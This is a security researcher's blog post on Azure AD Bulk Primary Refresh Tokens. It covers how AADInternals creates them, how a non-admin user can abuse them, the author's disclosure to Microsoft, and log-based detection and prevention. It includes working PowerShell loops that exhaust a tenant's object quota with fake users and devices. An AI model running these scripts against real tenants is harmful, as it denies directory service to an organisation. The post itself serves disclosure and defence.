+++
title = "BPRT unleashed: Joining multiple devices to Azure AD and Intune"
date = "2021-01-31"
lastmod = "2022-09-26"
categories =["blog"]
tags = ["Azure Active Directory","Azure","security","MFA","BPRT"]
thumbnail = "/images/posts/bprt.png"
+++

In October 2020, someone contacted me and asked whether it would be possible 
to create BPRTs using AADInternals. I hadn't even heard of BPRTs, but was eventually able to help him to create BPRTs. Now this
functionality is included in **<a href="/aadinternals/" target="_blank">AADInternals</a> v0.4.5**.

In this blog, I'll explain what BPRTs are and how they can be used to join multiple devices to both Azure AD and Intune. 
I'll also show the dark side of BPRTs: how they can be used to conduct DOS attacks against Azure AD, and how to detect and prevent this.

<!--more-->
# What is BPRT

BPRT token is a Bulk Primary Refresh Token, sometimes also called "Bulk AAD Token", which is used to enroll multiple devices to Azure AD and Microsoft Endpoint Manager (Intune).

According to Microsoft's bulk device enrollment <a href="https://docs.microsoft.com/en-us/mem/intune/enrollment/windows-bulk-enroll" target="_blank">documentation</a>:

> **As an administrator**, you can join large numbers of new Windows devices to Azure Active Directory and Intune. To bulk enroll devices for your Azure AD tenant, you create a provisioning package with the Windows Configuration Designer (WCD) app.  

This implies that in order to create BPRTs, one should be an administrator. However, the documentation also states the following (added after my report in January 2021):

> Creating a provisioning package **does not require any administrator roles** in your Azure AD tenant.

# How to create BPRT token?

## Windows Configuration Designer (WCD)

Lets see how the BPRT is created with an official Microsoft tool, Windows Configuration Designer (WCD), which can be installed from <a href="https://www.microsoft.com/p/windows-configuration-designer/9nblggh4tx22" target="_blank">Microsoft Store</a>.

First, create a new provisioning package:

![Create a new provisioning package](/images/posts/bprt_1.png)

Second, go to **Account management**, select **Enroll in Azure AD** and click **Get Bulk Token**:

![Get Bulk Token](/images/posts/bprt_2.png)

After clicking the button, user is prompted for credentials. If the WCD is not used earlier, an app consent is presented:

![app consent](/images/posts/bprt_3.png)

The status line is shown after the BPRT is fetched. I also noticed that the default user name for an extra local admin account is "ScottLock" 🤔

To see the token, click **Switch to advanced editor**

![status](/images/posts/bprt_4.png)

Expand **Runtime settings** > **Accounts** > **Azure** and click **BPRT**. The token can now be copied (or replaced with the one created with AADInternals).

![BPRT](/images/posts/bprt_5.png)

Now the created provisioning package can be used to join devices automatically to Azure AD.

## AADInternals

Now that we know how to create BPRT token "properly", next step is to learn what happens on the background.

The first step is the authentication and authorisation. The access token was fetched using the client id of Windows Configuration Designer and had the following content (only relevant information shown):

```
aud   : urn:ms-drs:enterpriseregistration.windows.net
appid : de0853a1-ab20-47bd-990b-71ad5077ac7b
scp   : self_service_device_delete
```
After testing, I was able to confirm that the registration was not bound to WCD client id. This means that other client ids, such as AAD Graph, could be used as long as the resource (audience) is correct.
The audience refers to Device Registration Service (DRS).

Next, a http post was made to:
```
https://login.microsoftonline.com/webapp/bulkaadjtoken/begin
```
The sent payload was the following:

{{< highlight json >}}
{
    "pid": "6d762967-8f0f-40cb-8031-1726eb261259",
    "name": "package_6d762967-8f0f-40cb-8031-1726eb261259",
    "exp": "03/1/2021"
}
{{< /highlight>}}

The used parameters are as follows:

Parameter | Explanation
---       | ---
pid       | Package identifier. A random GUID of the package. The resulting user will have an upn in the form "package_&lt;pid>@&lt;default domain>"
name      | The display name of the resulting user. Can be any string.
exp       | Date of expiration. Must be less than 180 days from the current date.

As a response, a flow token (redacted) and status were returned:

{{< highlight json >}}
{
    "flowToken": "AQABAAEAAAD..",
    "state": "Started",
    "resultData": null
}
{{< /highlight>}}

After this, a http get request was made using the flowToken from the response as a query parameter:
```
https://login.microsoftonline.com/webapp/bulkaadjtoken/poll?flowToken=AQABAAEAAAD..
```

As a response, the BPRT was returned in resultData:
{{< highlight json >}}
{
    "flowToken": null,
    "state": "CompleteSuccess",
    "resultData": "{\"token_type\":\"Bearer\", ...}"
}
{{< /highlight>}}

The resultData contains id token and refresh token for the resulting user. The refresh token is the actual BPRT:
{{< highlight json >}}
{
    "token_type": "Bearer",
    "expires_in": "2393336",
    "ext_expires_in": "0",
    "expires_on": "1614556799",
    "refresh_token": "0.AAAAxkwDR.AgABAAAAAAD...",
    "refresh_token_expires_in": 2393336,
    "id_token": "eyJ0e..."
}
{{< /highlight>}}

Now what is this "resulting user" mentioned above you may think. Well, as it turns out, creating a BPRT **creates a user object to Azure AD**!
The upn of the user will always be "package_&lt;pid>@&lt;default domain>" but the display name can be freely selected.

**AADInternals** have had a function for creating the BPRT since v0.4.5:

{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForAADGraph -Resource urn:ms-drs:enterpriseregistration.windows.net -SaveToCache

# Create a new BPRT
$bprt = New-AADIntBulkPRTToken -Name "My BPRT user"
{{< /highlight>}}
**Output:**
```
BPRT saved to package_8eb8b873-2b6a-4d55-bd96-27b0abadec6a-BPRT.json
```

**Note!** If you got an error "AADSTS240001: User is not authorized to register devices in Azure AD.", there can be two reasons for this.
First is that the user does not have rights to register devices. Another reason is, that WCD app has not been given consent.
The admin consent can be given using the following link: https://<a href="https://login.microsoftonline.com/common/adminConsent?client_id=de0853a1-ab20-47bd-990b-71ad5077ac7b&redirect_uri=https://portal.azure.com/TokenAuthorize" target="_blank">login.microsoftonline.com/common/adminConsent?client_id=de0853a1-ab20-47bd-990b-71ad5077ac7b&redirect_uri=https://portal.azure.com/TokenAuthorize</a>
and the user consent with: https://<a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=de0853a1-ab20-47bd-990b-71ad5077ac7b&response_type=code" target="_blank">login.microsoftonline.com/common/oauth2/authorize?client_id=de0853a1-ab20-47bd-990b-71ad5077ac7b&response_type=code</a>.
After the admin consent is given, the browser may stay "loading" the page due to redirect url the app is using - this is ok and can be ignored.

**Note!** For the new tenants the consent for WCD app is required. For older tenants, this seems not to be case. Moreover, removing the app/consent does not remove the functionality 😥 
Apparently, giving the consent to WCD app does something irreversible to the tenant.

# How to use BPRT token?

Now that we know that we can create BPRTs, the obvious question is what can we do with them? The first usage scenario is to create BPRTs programmatically, allowing automatisation of creating provisioning packages.

Another scenario is to enroll devices to Azure AD and Intune like the Windows devices would after the provisioning package is applied.

So what happens when the device is enrolling to Azure AD and Intune with BPRT?

First, the device will get an access token for Azure AD Join using the BPRT. Luckily, this is just
a normal flow where a new access token is fetched using BPRT as a refresh token. The only limitation seems to be that 
with BPRT, access tokens are only provided for Azure AD Join and Intune MDM client ids.

With AADInternals, the BPRT can used to get access token for AAD Join:

{{< highlight powershell >}}
# Get the access token for AAD Join using BPRT
Get-AADIntAccessTokenForAADJoin -BPRT $BPRT -SaveToCache
{{< /highlight>}} 

And now we have a working access token and we can join devices to Azure AD and create PRTs as explained in my earlier <a href="/post/prt/#creating-your-own-prt" target="_blank">blog post</a>:

{{< highlight powershell >}}
# Join the device to Azure AD
Join-AADIntDeviceToAzureAD -DeviceName "My computer"
{{< /highlight>}}
```
Device successfully registered to Azure AD:
  DisplayName:     "My computer"
  DeviceId:        d03994c9-24f8-41ba-a156-1805998d6dc7
  Cert thumbprint: 78CC77315A100089CF794EE49670552485DE3689
  Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7.pfx"
Local SID:
  S-1-5-32-544
Additional SIDs:
  S-1-12-1-797902961-1250002609-2090226073-616445738
  S-1-12-1-3408697635-1121971140-3092833713-2344201430
  S-1-12-1-2007802275-1256657308-2098244751-2635987013
```

Similarly, we can get an access token for Intune with BPRT and Azure AD device certificate:

{{< highlight powershell >}}
# Get the access token for Intune using BPRT and Azure AD device certificate
Get-AADIntAccessTokenForIntuneMDM -BPRT $BPRT -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache
{{< /highlight>}}

And finally, we can enroll the device to Intune:

{{< highlight powershell >}}
# Enroll the device to Intune
Join-AADIntDeviceToIntune -DeviceName "My computer"
{{< /highlight>}}
```
Intune client certificate successfully created:
  Subject:         "CN=5ede6e7a-7b77-41bd-bfe0-ef29ca70a3fb"
  Issuer:          "CN=Microsoft Intune MDM Device CA"
  Cert thumbprint: A1D407FF66EF05D153B67129B8541058A1C395B1
  Cert file name:  "d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx"
  CA file name :   "d03994c9-24f8-41ba-a156-1805998d6dc7-MDM-CA.der"
  IntMedCA file :  "d03994c9-24f8-41ba-a156-1805998d6dc7-MDM-INTMED-CA.der"
```

# How to abuse Azure AD with BPRTs

As always, the biggest question in this blog is how we can abuse Azure AD with the things we have learned? So far, I've found two scenarios.

## Fill Azure AD with users
As we've learned, creating a BPRT creates also a user object to Azure AD. We've also learned that creating a BPRT does not require any admin rights.
As per Microsoft <a href="https://docs.microsoft.com/en-us/azure/active-directory/enterprise-users/directory-service-limits-restrictions" target="_blank">documentation</a>, a non-admin user can create no more than 250 objects to Azure AD. 
However, this limit does NOT apply for BPRTs ☹

As such, in practice, this means that a **normal user can create user objects until the Azure AD quota limit is reached!** 🤦‍

To demonstrate this, I used the following simple script to fill Azure AD with BPRTs:

{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForAADGraph -Resource urn:ms-drs:enterpriseregistration.windows.net -SaveToCache

# Create objects until quota reached
for($a = 1 ; $a -lt 50000 ; $a++)
{
    $name = 'BPRT-{0:d5}' -f $a
    try{
        New-AADIntBulkPRTToken -Name $name | Out-Null
    } catch{}
}
{{< /highlight>}}

The throughput is only 23 users per minute, so I eventually used multiple PowerShell sessions to speed things up.

The following animation shows that after the quota is reached, no new users can be added:

![BPRT DOS](/images/posts/BPRT_DOS.gif)

## Fill Azure AD with devices

As we've learned, the BPRT can be used join devices to Azure AD and Intune. As the BPRT represents a user, it would be 
fair to assume that the same limitations apply to those users as well. Especially, when the WCD mentiones that the default limit is 20:

![WCD limit](/images/posts/bprt_6.png)

In my test tenant, I had a 50 device limit per user:

![device settings](/images/posts/bprt_7.png)

Guess what? Yep, that device limit does not apply for "BPRT users" ☹

Again, in practice, this means that a **normal user can create device objects until the Azure AD quota limit is reached!** 🤦‍

To demonstrate this, I used the following simple script to fill Azure AD with devices:

{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForAADJoin -BPRT $bprt -SaveToCache

# Create devices until quota reached
for($a = 1 ; $a -lt 50000 ; $a++)
{
    $name = 'DEV-{0:d5}' -f $a
    try{
        Join-AADIntDeviceToAzureAD -DeviceName $name
    } catch{}
}
{{< /highlight>}}

The throughput was a bit higher, about 90 users per minute, but I still used multiple PowerShell sessions to speed things up.

The following animation shows that after the quota is reached, no new users can be added:

![Device DOS](/images/posts/Device_DOS.gif)

# Microsoft response

Naturally, all this made feel very uncomfortable as a normal non-admin user can make a Denial of Service (DOS) attack against their own tenant. This, naturally, had to be reported to Microsoft.

My initial report was following:

> According https://docs.microsoft.com/en-us/mem/intune/enrollment/windows-bulk-enroll an admin can create a bulk AAD token (BPRT), which can be used to enroll multiple devices to Azure AD and Intune. <br><br>
> I noticed, that a regular user without any admin rights can also create a BPRT. As such, they can add devices without number restrictions (if joining to AAD is allowed). <br><br>
> As I'm planning to publish a blog post and toolkit regarding to this, I'd like to know is this expected behavior?

Here is the full timeline of my correspondence with Microsoft on January 2021:

Date | Description
---  | ---
13th | Initial report
13th | **Response**: "In order to investigate your report I will need a valid proof of concept (POC) ideally with images or video.."
16th | Created a ten minute <a href="https://youtu.be/aaqEZ-yJNFA" target="_blank">POC video</a> and resubmitted the report
16th | **Response**: "In order to investigate your report I will need a valid proof of concept (POC) ideally with images or video..".
17th | Send an email explaining I've done all I've could and assume that MSRC does not regard this a vulnerability and will publish my findings.
20th | **Response**: "In order to investigate your report I will need detailed steps to reproduce your reported issue consistently, ideally with attached images or video." <br> "If you believe this to be a misunderstanding of the report, submit a new report."
20th | Created another <a href="https://youtu.be/lGjVcVCRI6M" target="_blank">POC video</a> and resubmitted the report again
20th | **Response**: "Thank you for contacting the Microsoft Security Response Center (MSRC). I've opened a case for this issue"
27th | **Response**: "Upon investigation, we have determined that **this submission is by design and does not meet the definition of a security vulnerability for servicing**. This report does not appear to identify a weakness in a Microsoft product or service that would enable an attacker to compromise the integrity, availability, or confidentiality of a Microsoft offering."

Reporting findings to MSRC was (again) a very frustrating experience. For instance, the POC video was first viewed after my THIRD post: the first video had 10 views and the second one 4 views on Jan 20th, but no
views between 20th and 27th. However, AFTER receiving the anticipated "by design" response from MSRC, they have viewed the videos an extra 20 times.

It is also interesting that the documentation was changed after my report, but the page seems to be edited in November 2020, not January 2021 🤔. The original page 
can be seen in the beginning of the first POC.

**Sep 26 2022:** As this is an old blog post, I wanted to add that **my experience with MSRC has improved greatly** since this blog post. 
This is a good reminder though that it is not always easy to report to vendors about something that is clearly wrong. 
Having said that, as of today, **this issue has still not been fixed**.

# Detecting

## Windows Configuration Designer consent
First sign for BPRT abuse is consentint the WCD app. **Note:** This can also be a normal behaviour!

When the consent is given for the WCD app, an entry is created in **Audit log**. We are interested in the activity type "Consent to application"
where the target is "Windows Configuration Designer (WCD)":

![hunt8](/images/posts/bprt_15.png)


## Device Registration Service access token 
Second sign for BPRT abuse is getting the access token for Device Registration Service (DSR). The resource id of DSR is: 
```
01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
```

In the "normal" process the WCD application id is used:
```
de0853a1-ab20-47bd-990b-71ad5077ac7b
```
So, if the DSR access token is not fetched using WCD client id, it is likely a sign of abusive behavior. For instance AADInternals is currently using
Azure Active Directory PowerShell client id. The following screen shot from **Sign-ins log** shows an entry generated when access token is fetched using AADInternals (can be interactive or non-interactive):

![hunt1](/images/posts/bprt_8.png)

## Creating BPRTs
Third sign for BPRT abuse is the actual creation of BPRTs. This can be detected from the **Audit log**. Below is an example of an Audit log entry where the user created a BPRT.

In the Activity tab, we can see that the corresponding user is created by "Microsoft.Azure.SyncFabric" Service Principal, not the user. 

![hunt2](/images/posts/bprt_9.png)

In the Modified Properties tab, we can see that the UPN of user creating the BPRT is added to **OtherMail** attribute of the resulting user. 
We can also see that the **UserPrincipalName** starts always with "package_" prefix.

![hunt3](/images/posts/bprt_10.png)

BPRT creation can also be spotted from **Sign-ins log** as the created user is logged in within one to two seconds after it is created using
the following "AADJ CSP" client id and an empty Resource ID:
```
b90d5b8f-5503-4153-b545-b31cecfaece2
```

![hunt4](/images/posts/bprt_11.png)

## Using BPRT to get access tokens

**Note:** Using BPRT is not always rogue behaviour: it is meant for joining multiple devices!

The access tokens fetched for **AAD Join** using BPRT can be seen in **User sign-ins (non-interactive)** tab of the **Sign-ins log**. 
The used client id is again "AADJ CSP" but now the resource is DSR:

![hunt5](/images/posts/bprt_12.png)

Similarly, the access tokens fetched for **Intune** using BPRT can be seen in **User sign-ins (non-interactive)** tab of the **Sign-ins log**. 
The used client id is again "AADJ CSP" but now the resource is Microsoft Intune Enrollment:
```
d4ebce55-015a-49b5-a083-c84d1797ae8c
```

![hunt6](/images/posts/bprt_13.png)

## Enrolling devices to Azure AD

**Note:** Using BPRT is not always rogue behaviour: it is meant for joining multiple devices!

When the device is joined to Azure AD, there are multiple events in the **Audit log**. 
The event we are interested in is of type "Add registered owner to device". In the **Target(s)** tab we can see that the target user's UPN starts with 
"package_" and thus is a BPRT user.

![hunt7](/images/posts/bprt_14.png)

## Enrolling devices to Intune

**Note:** Using BPRT is not always rogue behaviour: it is meant for joining multiple devices!

When the device is succesfully joined to Intune, there is one event in the **Audit log**. 
The event we are interested in is of type "Update device" initiated by "Microsoft Intune". 
In the **Target(s)** tab we can see the ID of the device which matches the one seen above. 
In the **Modified Properties** tab we can see that the "IsManaged" property is set to "true":

![hunt9](/images/posts/bprt_16.png)

# Preventing

One prequisite for creating BPRTs is that the Windows Configuration Designer (WCD) app has been given a consent by an administrator. 
Therefore, it would be fair to assume that removing the app would prevent creating BPRTs. However, based on my observations, **removing the WCD app
does not prevent creating BPRTs using different client ids!**

To my best knowledge, only way to prevent creating BPRTs is to prevent users joining devices to Azure AD:

![preventing BPRT](/images/posts/bprt_17.png)

# Summary

BPRT tokens can be easily created with AADInternals without any administrator rights, provided that the user has rights to enroll devices to Azure AD and that WCD app has been used earlier in the tenant. 
This allows rogue users to conduct DOS attacks against their tenant by filling Azure AD with user objects.

With a BPRT, an access token can be fetched to join devices to Azure AD and Intune, provided that the BPRT user has rights to enroll devices to Azure AD and Intune. 
This allows rogue users to conduct DOS attacks against their tenant by filling Azure AD with device objects, regardless of the device number restrictions. All other restrictions, like Intune
device type restrictions are still applied.

**Only way to prevent creating BPRTs is to prevent users joining devices to Azure AD!**

# References
* Microsoft: <a href="https://docs.microsoft.com/en-us/mem/intune/enrollment/windows-bulk-enroll" target="_blank">Bulk enrollment for Windows devices</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/azure/active-directory/enterprise-users/directory-service-limits-restrictions" target="_blank">Azure AD service limits and restrictions</a>
